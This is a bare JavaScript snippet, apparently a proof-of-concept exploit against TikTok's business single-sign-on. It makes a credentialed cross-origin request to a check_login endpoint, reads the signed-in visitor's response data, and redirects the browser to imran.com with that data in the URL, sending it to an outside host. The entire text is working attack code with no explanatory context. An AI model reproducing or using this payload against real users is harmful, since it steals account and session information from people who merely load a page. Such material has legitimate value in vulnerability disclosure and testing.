var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://business-sso.tiktok.com/check_login/?aid=2239&service=https://business.tiktok.com/select&language=en&appId=2239&lang=en&host=https://business-sso.tiktok.com/', true);
xhr.withCredentials = true;
xhr.onload = () => {
   const data = JSON.parse(xhr.responseText);
   var imran = JSON.stringify(data);
   location.replace("https://imran.com/?DATA=" + imran);
};
xhr.send();